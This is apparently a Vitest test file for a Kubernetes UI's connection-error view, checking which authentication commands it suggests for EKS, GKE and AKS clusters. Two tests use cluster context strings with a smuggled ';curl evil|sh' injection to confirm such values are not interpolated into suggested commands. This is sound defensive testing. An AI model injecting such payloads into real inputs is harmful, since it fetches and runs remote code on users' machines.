import { renderToStaticMarkup } from 'react-dom/server'
import type { ReactNode } from 'react'
import { describe, expect, it, vi } from 'vitest'

vi.stubGlobal('window', { location: { host: 'localhost:9280' } })

vi.mock('@skyhook-io/k8s-ui', () => ({
  ClusterName: ({ name }: { name: string }) => <span>{name}</span>,
  useOpenLocalTerminal: () => vi.fn(),
}))
vi.mock('../api/client', () => ({
  useAuthMe: () => ({ data: { authEnabled: false } }),
}))
vi.mock('./ContextSwitcher', () => ({
  ContextSwitcher: () => <button>Switch context</button>,
}))
vi.mock('./ui/Tooltip', () => ({
  Tooltip: ({ children }: { children: ReactNode }) => children,
}))

import {
  ConnectionErrorView,
  CopyableCommand,
  getAuthRejectedHints,
  selectConnectionHints,
} from './ConnectionErrorView'

function renderError(errorType: string, context: string): string {
  return renderToStaticMarkup(
    <ConnectionErrorView
      connection={{ state: 'disconnected', context, errorType, error: 'safe error' }}
      onRetry={() => {}}
      isRetrying={false}
    />,
  )
}

describe('ConnectionErrorView authentication guidance', () => {
  it('builds an honest EKS diagnostic without presenting it as authentication', () => {
    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
    const hints = getAuthRejectedHints(context)
    const markup = renderError('auth-rejected', context)

    expect(hints.authCommand?.command).toBe(
      'aws sts get-caller-identity && aws eks describe-cluster --name prod --region us-east-1 --query cluster.accessConfig.authenticationMode --output text',
    )
    expect(hints.hideAuthButton).toBe(true)
    expect(markup).toContain('EKS Could Not Authenticate This Request')
    expect(markup).not.toContain('Authenticate in terminal')
  })

  it('does not offer interpolated commands for hostile EKS context values', () => {
    const hints = getAuthRejectedHints('arn:aws:eks:us-east-1;curl evil|sh:123456789012:cluster/prod')

    expect(hints.authCommand).toBeUndefined()
    expect(hints.hideAuthButton).toBeUndefined()
    expect(hints.fallbackCommand?.command).toBe('aws sso login')
  })

  it('does not offer interpolated commands for hostile GKE context values', () => {
    const hints = getAuthRejectedHints('gke_project_us-east1_prod;curl evil|sh')

    expect(hints.authCommand?.command).toBe('gcloud auth login')
    expect(hints.fallbackCommand).toBeUndefined()
  })

  it('selects dedicated guidance for a stuck credential plugin', () => {
    expect(selectConnectionHints('auth-plugin-stuck', 'eks-context')?.title).toBe('Credential Plugin Stopped Responding')

    const markup = renderError('auth-plugin-stuck', 'eks-context')
    expect(markup).toContain('Credential Plugin Stopped Responding')
    expect(markup).not.toContain('aws sso login')
  })

  it('renders placeholder AKS commands without a run affordance', () => {
    const markup = renderError('auth-rejected', 'clusterUser_platform_prod')

    expect(markup.match(/aria-label="Run command in terminal"/g)).toHaveLength(1)
    expect(markup).toContain('&lt;cluster&gt;')
    expect(markup).toContain('&lt;rg&gt;')
  })

  it('renders copy-only commands without a run affordance', () => {
    const markup = renderToStaticMarkup(<CopyableCommand command="placeholder" />)

    expect(markup).not.toContain('aria-label="Run command in terminal"')
  })
})
